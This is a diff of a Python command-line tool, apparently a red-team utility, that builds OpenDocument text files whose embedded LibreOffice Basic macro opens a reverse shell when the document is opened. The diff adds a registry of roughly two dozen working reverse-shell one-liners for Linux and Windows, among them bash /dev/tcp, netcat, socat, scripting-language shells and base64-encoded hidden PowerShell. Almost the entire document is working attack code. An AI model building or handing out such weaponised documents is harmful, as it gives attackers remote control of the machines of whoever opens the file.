@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 """
 ODT Reverse Shell Generator
-Generates a malicious ODT file with an embedded LibreOffice Basic macro
-that executes a reverse shell on document open.
+Author: Abdulrahman Mustafa
+
+Generates ODT files with embedded LibreOffice Basic macros
+for reverse shell execution on document open.
 
 For authorized red team / penetration testing engagements only.
 """
@@ -12,37 +14,293 @@ import base64
 import html
 import sys
 import zipfile
+from collections import OrderedDict
 
 
-def build_linux_macro(ip, port):
-    return (
-        "Sub Main\n"
-        f'    Shell "/bin/bash", 0, "-c \'bash -i >& /dev/tcp/{ip}/{port} 0>&1\'"\n'
-        "End Sub"
-    )
+# ---------------------------------------------------------------------------
+# Macro builders
+# ---------------------------------------------------------------------------
+
+def _macro(program, params):
+    esc_p = params.replace('"', '""')
+    return f'Sub Main\n    Shell "{program}", 0, "{esc_p}"\nEnd Sub'
 
 
-def build_windows_macro(ip, port):
-    ps = (
-        f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
-        "$s=$c.GetStream();"
-        "[byte[]]$b=0..65535|%{0};"
-        "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
-        "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
-        "$r=(iex $d 2>&1|Out-String);"
-        "$r2=$r+'PS '+(pwd).Path+'> ';"
-        "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
-        "$s.Write($sb,0,$sb.Length);"
-        "$s.Flush()};"
-        "$c.Close()"
-    )
-    encoded = base64.b64encode(ps.encode("utf-16-le")).decode()
-    return (
-        "Sub Main\n"
-        f'    Shell "cmd.exe", 0, "/c powershell -nop -w hidden -e {encoded}"\n'
-        "End Sub"
-    )
+def _linux(cmd):
+    if "'" not in cmd:
+        return _macro("/bin/bash", f"-c '{cmd}'")
+    encoded = base64.b64encode(cmd.encode()).decode()
+    return _macro("/bin/bash", f"-c 'echo {encoded}|base64 -d|bash'")
 
+
+def _windows_ps(ps_cmd):
+    encoded = base64.b64encode(ps_cmd.encode("utf-16-le")).decode()
+    return _macro("powershell.exe", f"-nop -w hidden -e {encoded}")
+
+
+def _windows_cmd(cmd):
+    return _macro("cmd.exe", f"/c {cmd}")
+
+
+def _windows_via_ps(lang_cmd):
+    return _windows_ps(f"& {lang_cmd}")
+
+
+# ---------------------------------------------------------------------------
+# Payload registry
+# ---------------------------------------------------------------------------
+
+def _build_linux_payloads():
+    P = OrderedDict()
+
+    def add(name, desc, requires, fn):
+        P[name] = {"desc": desc, "requires": requires, "build": fn}
+
+    # -- Bash --
+    add("bash-tcp", "Bash /dev/tcp reverse shell", "bash",
+        lambda ip, p: _linux(f"bash -i >& /dev/tcp/{ip}/{p} 0>&1"))
+
+    add("bash-udp", "Bash /dev/udp reverse shell", "bash",
+        lambda ip, p: _linux(f"bash -i >& /dev/udp/{ip}/{p} 0>&1"))
+
+    # -- Netcat variants --
+    add("nc-e", "Netcat -e reverse shell", "nc (traditional)",
+        lambda ip, p: _linux(f"nc -e /bin/bash {ip} {p}"))
+
+    add("nc-c", "Netcat -c reverse shell", "nc (OpenBSD with -c)",
+        lambda ip, p: _linux(f"nc -c bash {ip} {p}"))
+
+    add("nc-mkfifo", "Netcat mkfifo (no -e/-c)", "nc, mkfifo",
+        lambda ip, p: _linux(
+            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {p} >/tmp/f"))
+
+    add("nc-mknod", "Netcat mknod pipe method", "nc, mknod",
+        lambda ip, p: _linux(
+            f"mknod /tmp/bp p && nc {ip} {p} 0</tmp/bp | /bin/bash 1>/tmp/bp"))
+
+    # -- Ncat --
+    add("ncat", "Ncat (Nmap) reverse shell", "ncat",
+        lambda ip, p: _linux(f"ncat {ip} {p} -e /bin/bash"))
+
+    add("ncat-ssl", "Ncat with SSL encryption", "ncat",
+        lambda ip, p: _linux(f"ncat --ssl {ip} {p} -e /bin/bash"))
+
+    # -- Socat --
+    add("socat", "Socat interactive PTY shell", "socat",
+        lambda ip, p: _linux(
+            f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{p}"))
+
+    # -- Python --
+    def _py(ip, p, binary):
+        cmd = (f"""{binary} -c 'import socket,subprocess,os;"""
+               f"""s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"""
+               f"""s.connect(("{ip}",{p}));"""
+               f"""os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"""
+               f"""subprocess.call(["/bin/bash","-i"])'""")
+        return _linux(cmd)
+
+    add("python", "Python 2 reverse shell", "python",
+        lambda ip, p: _py(ip, p, "python"))
+
+    add("python3", "Python 3 reverse shell", "python3",
+        lambda ip, p: _py(ip, p, "python3"))
+
+    # -- Perl --
+    def _perl_linux(ip, p):
+        cmd = (f"""perl -e 'use Socket;$i="{ip}";$p={p};"""
+               f"""socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));"""
+               f"""if(connect(S,sockaddr_in($p,inet_aton($i))))"""
+               f"""{{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");"""
+               f"""exec("/bin/bash -i")}};'""")
+        return _linux(cmd)
+
+    add("perl", "Perl reverse shell", "perl", _perl_linux)
+
+    # -- PHP --
+    def _php_linux(ip, p):
+        cmd = (f"""php -r '$sock=fsockopen("{ip}",{p});"""
+               f"""$proc=proc_open("/bin/bash -i","""
+               f"""array(0=>$sock,1=>$sock,2=>$sock),$pipes);'""")
+        return _linux(cmd)
+
+    add("php", "PHP reverse shell (proc_open)", "php", _php_linux)
+
+    # -- Ruby --
+    def _ruby_linux(ip, p):
+        cmd = (f"""ruby -rsocket -e 'f=TCPSocket.open("{ip}",{p}).to_i;"""
+               f"""exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'""")
+        return _linux(cmd)
+
+    add("ruby", "Ruby reverse shell", "ruby", _ruby_linux)
+
+    # -- Node.js --
+    def _node_linux(ip, p):
+        cmd = (f"""node -e 'var net=require("net"),"""
+               f"""sh=require("child_process").exec("/bin/bash");"""
+               f"""var c=new net.Socket();"""
+               f"""c.connect({p},"{ip}",function()"""
+               f"""{{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}});'""")
+        return _linux(cmd)
+
+    add("node", "Node.js reverse shell", "node", _node_linux)
+
+    # -- Telnet --
+    add("telnet", "Telnet mkfifo reverse shell", "telnet, mkfifo",
+        lambda ip, p: _linux(
+            f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {p} 0<$TF | /bin/bash 1>$TF"))
+
+    # -- OpenSSL --
+    add("openssl", "OpenSSL encrypted reverse shell", "openssl, mkfifo",
+        lambda ip, p: _linux(
+            f"mkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1"
+            f"|openssl s_client -quiet -connect {ip}:{p} > /tmp/s;rm /tmp/s"))
+
+    # -- AWK --
+    def _awk_linux(ip, p):
+        cmd = (f"""awk 'BEGIN{{s="/inet/tcp/0/{ip}/{p}";"""
+               f"""while(42){{do{{printf "$ "|&s;s|&getline c;"""
+               f"""if(c){{while((c|&getline)>0)print $0|&s;close(c)}}"""
+               f"""}}while(c!="exit")close(s)}}}}'""")
+        return _linux(cmd)
+
+    add("awk", "AWK /inet reverse shell", "gawk",  _awk_linux)
+
+    # -- Lua --
+    def _lua_linux(ip, p):
+        cmd = (f"""lua -e 'local s=require("socket");"""
+               f"""local t=assert(s.tcp());t:connect("{ip}",{p});"""
+               f"""while true do local r,x=t:receive();"""
+               f"""local f=assert(io.popen(r,"r"));"""
+               f"""local b=assert(f:read("*a"));t:send(b);end;"""
+               f"""f:close();t:close();'""")
+        return _linux(cmd)
+
+    add("lua", "Lua (luasocket) reverse shell", "lua, luasocket", _lua_linux)
+
+    return P
+
+
+def _build_windows_payloads():
+    P = OrderedDict()
+
+    def add(name, desc, requires, fn):
+        P[name] = {"desc": desc, "requires": requires, "build": fn}
+
+    # -- PowerShell (standard) --
+    def _ps_standard(ip, p):
+        ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
+              "$s=$c.GetStream();"
+              "[byte[]]$b=0..65535|%{0};"
+              "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
+              "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
+              "$r=(iex $d 2>&1|Out-String);"
+              "$r2=$r+'PS '+(pwd).Path+'> ';"
+              "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
+              "$s.Write($sb,0,$sb.Length);"
+              "$s.Flush()};"
+              "$c.Close()")
+        return _windows_ps(ps)
+
+    add("powershell", "PowerShell TCPClient (base64)", "powershell", _ps_standard)
+
+    # -- PowerShell with error handling --
+    def _ps_trycatch(ip, p):
+        ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
+              "$s=$c.GetStream();"
+              "[byte[]]$b=0..65535|%{0};"
+              "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
+              "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
+              "try{$r=(iex $d 2>&1|Out-String)}catch{$r=$_.Exception.Message};"
+              "$r2=$r+'PS '+(pwd).Path+'> ';"
+              "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
+              "$s.Write($sb,0,$sb.Length);"
+              "$s.Flush()};"
+              "$c.Close()")
+        return _windows_ps(ps)
+
+    add("powershell-trycatch", "PowerShell with error handling", "powershell",
+        _ps_trycatch)
+
+    # -- PowerShell TLS --
+    def _ps_tls(ip, p):
+        ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{p});"
+              "$s=$c.GetStream();"
+              "$ssl=New-Object System.Net.Security.SslStream($s,$false,({$true}));"
+              f"$ssl.AuthenticateAsClient('{ip}');"
+              "[byte[]]$b=0..65535|%{0};"
+              "while(($i=$ssl.Read($b,0,$b.Length)) -ne 0)"
+              "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
+              "$r=(iex $d 2>&1|Out-String);"
+              "$sb=([Text.Encoding]::ASCII).GetBytes($r);"
+              "$ssl.Write($sb,0,$sb.Length);"
+              "$ssl.Flush()};"
+              "$c.Close()")
+        return _windows_ps(ps)
+
+    add("powershell-tls", "PowerShell TLS encrypted shell", "powershell",
+        _ps_tls)
+
+    # -- nc.exe --
+    add("nc", "nc.exe -e cmd.exe", "nc.exe on target",
+        lambda ip, p: _windows_cmd(f"nc.exe -e cmd.exe {ip} {p}"))
+
+    # -- Python (Windows) --
+    def _py_win(ip, p):
+        ps = (f"""& python -c 'import socket,subprocess,os;"""
+              f"""s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"""
+              f"""s.connect(("{ip}",{p}));"""
+              f"""os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"""
+              f"""subprocess.call(["cmd.exe"])'""")
+        return _windows_ps(ps)
+
+    add("python", "Python reverse shell via PowerShell", "python, powershell",
+        _py_win)
+
+    # -- Perl (Windows) --
+    def _perl_win(ip, p):
+        ps = (f"""& perl -e 'use Socket;$i="{ip}";$p={p};"""
+              f"""socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));"""
+              f"""if(connect(S,sockaddr_in($p,inet_aton($i))))"""
+              f"""{{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");"""
+              f"""exec("cmd.exe")}};'""")
+        return _windows_ps(ps)
+
+    add("perl", "Perl reverse shell via PowerShell", "perl, powershell",
+        _perl_win)
+
+    # -- Ruby (Windows) --
+    def _ruby_win(ip, p):
+        ps = (f"""& ruby -rsocket -e "c=TCPSocket.new('{ip}',{p});"""
+              f"""while(cmd=c.gets);IO.popen(cmd,'r'){{|io|c.print io.read}}end\"""")
+        return _windows_ps(ps)
+
+    add("ruby", "Ruby reverse shell via PowerShell", "ruby, powershell",
+        _ruby_win)
+
+    # -- Node.js (Windows) --
+    def _node_win(ip, p):
+        ps = (f"""& node -e "var net=require('net'),"""
+              f"""sh=require('child_process').exec('cmd.exe');"""
+              f"""var c=new net.Socket();"""
+              f"""c.connect({p},'{ip}',function()"""
+              f"""{{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);}});\"""")
+        return _windows_ps(ps)
+
+    add("node", "Node.js reverse shell via PowerShell", "node, powershell",
+        _node_win)
+
+    return P
+
+
+PAYLOADS = {
+    "linux": _build_linux_payloads(),
+    "windows": _build_windows_payloads(),
+}
+
+
+# ---------------------------------------------------------------------------
+# ODT XML templates
+# ---------------------------------------------------------------------------
 
 MIMETYPE = "application/vnd.oasis.opendocument.text"
 
@@ -131,6 +389,10 @@ MANIFEST_XML = """\
 </manifest:manifest>"""
 
 
+# ---------------------------------------------------------------------------
+# ODT generator
+# ---------------------------------------------------------------------------
+
 def build_module_xml(macro_code):
     return (
         '<?xml version="1.0" encoding="UTF-8"?>\n'
@@ -142,8 +404,9 @@ def build_module_xml(macro_code):
     )
 
 
-def generate_odt(ip, port, target_os, output):
-    macro = build_linux_macro(ip, port) if target_os == "linux" else build_windows_macro(ip, port)
+def generate_odt(ip, port, target_os, payload_name, output):
+    payload = PAYLOADS[target_os][payload_name]
+    macro = payload["build"](ip, port)
 
     with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zf:
         zf.writestr("mimetype", MIMETYPE, compress_type=zipfile.ZIP_STORED)
@@ -155,45 +418,94 @@ def generate_odt(ip, port, target_os, output):
         zf.writestr("Basic/script-lc.xml", SCRIPT_LC)
         zf.writestr("META-INF/manifest.xml", MANIFEST_XML)
 
-    print(f"[+] Generated ODT with {target_os} reverse shell macro")
+    print(f"[+] Payload:  {payload_name} — {payload['desc']}")
+    print(f"[+] Requires: {payload['requires']}")
+    print(f"[+] Target:   {target_os}")
     print(f"[+] Callback: {ip}:{port}")
     print(f"[+] Output:   {output}")
-    print(f"[+] Macro triggers on document open (requires macros enabled in LibreOffice)")
+    print(f"[+] Macro triggers on document open (requires macros enabled)")
+
+
+# ---------------------------------------------------------------------------
+# CLI
+# ---------------------------------------------------------------------------
+
+def list_payloads(target_os):
+    payloads = PAYLOADS[target_os]
+    print(f"\n  Available {target_os} payloads ({len(payloads)}):\n")
+    print(f"  {'NAME':<22} {'REQUIRES':<24} DESCRIPTION")
+    print(f"  {'─' * 22} {'─' * 24} {'─' * 36}")
+    for name, info in payloads.items():
+        print(f"  {name:<22} {info['requires']:<24} {info['desc']}")
+    print()
 
 
 def main():
+    all_names = sorted(set(
+        list(PAYLOADS["linux"].keys()) + list(PAYLOADS["windows"].keys())
+    ))
+
     parser = argparse.ArgumentParser(
         description="ODT Reverse Shell Generator — Red Team Tool",
         epilog=(
-            "Examples:\n"
+            "examples:\n"
             "  %(prog)s 10.10.14.5 4444\n"
-            "  %(prog)s 10.10.14.5 4444 --os windows -o shell.odt\n"
+            "  %(prog)s 10.10.14.5 4444 --os windows --payload powershell-tls\n"
+            "  %(prog)s 10.10.14.5 9001 --payload nc-mkfifo -o doc.odt\n"
+            "  %(prog)s --list --os linux\n"
+            "  %(prog)s --list --os windows\n"
             "\n"
-            "Start a listener:  nc -lvnp 4444"
+            "start a listener:\n"
+            "  nc -lvnp 4444\n"
+            "  ncat --ssl -lvnp 4444        (for ncat-ssl / powershell-tls)\n"
+            "  openssl s_server -quiet -key key.pem -cert cert.pem -port 4444\n"
+            "\n"
+            "author: Abdulrahman Mustafa\n"
         ),
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
-    parser.add_argument("ip", help="Listener IP address for the reverse shell callback")
-    parser.add_argument("port", type=int, help="Listener port number")
+    parser.add_argument("ip", nargs="?", help="Listener IP address")
+    parser.add_argument("port", nargs="?", type=int, help="Listener port (1-65535)")
     parser.add_argument(
-        "--os",
-        choices=["linux", "windows"],
-        default="linux",
-        dest="target_os",
-        help="Target OS for the reverse shell payload (default: linux)",
+        "--os", choices=["linux", "windows"], default="linux",
+        dest="target_os", help="Target OS (default: linux)",
     )
     parser.add_argument(
-        "-o", "--output",
-        default="revshell.odt",
-        help="Output ODT filename (default: revshell.odt)",
+        "--payload", "-p", default=None,
+        help="Payload type (default: bash-tcp / powershell). Use --list to see all",
+    )
+    parser.add_argument(
+        "-o", "--output", default="revshell.odt",
+        help="Output filename (default: revshell.odt)",
+    )
+    parser.add_argument(
+        "--list", "-l", action="store_true",
+        help="List available payloads for the selected OS",
     )
 
     args = parser.parse_args()
 
+    if args.list:
+        list_payloads(args.target_os)
+        sys.exit(0)
+
+    if not args.ip or args.port is None:
+        parser.error("IP and PORT are required (unless using --list)")
+
     if not 1 <= args.port <= 65535:
         parser.error("port must be between 1 and 65535")
 
-    generate_odt(args.ip, args.port, args.target_os, args.output)
+    defaults = {"linux": "bash-tcp", "windows": "powershell"}
+    payload_name = args.payload or defaults[args.target_os]
+
+    if payload_name not in PAYLOADS[args.target_os]:
+        available = ", ".join(PAYLOADS[args.target_os].keys())
+        parser.error(
+            f"payload '{payload_name}' not available for {args.target_os}. "
+            f"Choose from: {available}"
+        )
+
+    generate_odt(args.ip, args.port, args.target_os, payload_name, args.output)
 
 
 if __name__ == "__main__":
